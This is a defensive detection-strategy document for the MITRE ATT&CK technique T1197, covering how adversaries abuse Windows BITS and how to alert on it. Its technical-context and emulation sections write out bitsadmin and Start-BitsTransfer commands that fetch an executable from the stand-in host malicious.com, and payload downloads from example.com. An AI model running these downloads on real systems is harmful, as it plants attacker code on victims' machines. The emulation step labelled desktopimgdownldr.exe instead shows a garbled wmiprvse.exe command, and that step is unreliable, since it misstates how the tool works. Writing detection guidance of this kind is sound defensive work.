# Alerting & Detection Strategy for BITS Jobs (T1197)

## **Goal**
The primary goal of this technique is to detect adversarial attempts to bypass security monitoring using Windows Background Intelligent Transfer Service (BITS). This method allows adversaries to download files from the internet covertly, evading traditional detection mechanisms like firewalls and antivirus solutions.

## **Categorization**

- **MITRE ATT&CK Mapping:** T1197 - BITS Jobs
- **Tactic / Kill Chain Phases:** 
  - Defense Evasion
  - Persistence
- **Platforms:** Windows

[MITRE ATT&CK Reference](https://attack.mitre.org/techniques/T1197)

## **Strategy Abstract**
The detection strategy involves monitoring and analyzing the use of BITS for downloading files. This includes examining:
- Command-line usage (e.g., `bitsadmin`)
- PowerShell commands
- Execution patterns that indicate persistence attempts

Key data sources include event logs, command execution traces, and network traffic associated with BITS activities.

## **Technical Context**
Adversaries use BITS to perform background file transfers without detection. The technique is executed using:
- Command Prompt: Utilizing `bitsadmin` for downloads.
- PowerShell: Leveraging cmdlets like `Start-BitsTransfer`.
  
Adversaries may target system persistence by downloading and executing malicious payloads covertly.

**Example Commands:**
- **Cmd:** `bitsadmin /transfer "download" https://malicious.com/file.exe C:\path\to\file.exe`
- **PowerShell:** 
  ```powershell
  Start-BitsTransfer -Source https://malicious.com/file.exe -Destination C:\path\to\file.exe
  ```

## **Blind Spots and Assumptions**
- **Limitations:**
  - Detection may miss BITS jobs initiated through obfuscated or encoded commands.
  - Encrypted transfers complicate traffic analysis.

- **Assumptions:**
  - The environment has access to comprehensive event logs and network monitoring tools.
  - BITS is not disabled in the system's security policies.

## **False Positives**
Potential benign activities that could trigger false alerts include:
- Legitimate use of `bitsadmin` for software updates or large file transfers by authorized applications.
- Scheduled tasks using BITS for routine backups or synchronizations.

## **Priority**
**Severity: High**

Justification: 
- The ability to download and execute files covertly without detection poses a significant threat to system integrity and data security.
- Exploitation of this technique can lead to persistent access and lateral movement within the network.

## **Validation (Adversary Emulation)**
### Steps for Emulating T1197 in a Test Environment:

1. **Bitsadmin Download (cmd):**
   - Execute: `bitsadmin /transfer "download" https://example.com/file.exe C:\downloads\file.exe`
   
2. **Bitsadmin Download (PowerShell):**
   - Execute:
     ```powershell
     Start-BitsTransfer -Source https://example.com/file.exe -Destination C:\downloads\file.exe
     ```

3. **Persist, Download, & Execute:**
   - Create a scheduled task that triggers the BITS download and execution upon system start.

4. **Bits Download using desktopimgdownldr.exe (cmd):**
   - Use `desktopimgdownldr.exe` to download a file:
     ```cmd
     "C:\Windows\System32\wbem\wmiprvse.exe" /f:\\path\\to\\payload.exe http://example.com/payload.exe
     ```

## **Response**
When an alert is triggered, analysts should:
- Verify the source and legitimacy of the download.
- Assess whether any downloaded files are malicious through file analysis tools.
- Check for persistence mechanisms linked to BITS jobs.

Additional steps include isolating affected systems and conducting a thorough investigation into network traffic patterns associated with detected BITS activities.

## **Additional Resources**
For further reference and context, consider exploring:
- Suspicious usage of `desktopimgdownldr.exe`.
- Monitoring web request commands (`bitsadmin`) for unusual targets.
- Analysis of downloads from file-sharing websites to uncommon or suspicious directories.
- Reviewing logs for files downloaded with unusual extensions via BITS. 

These resources provide additional insights into identifying and mitigating threats associated with the misuse of BITS.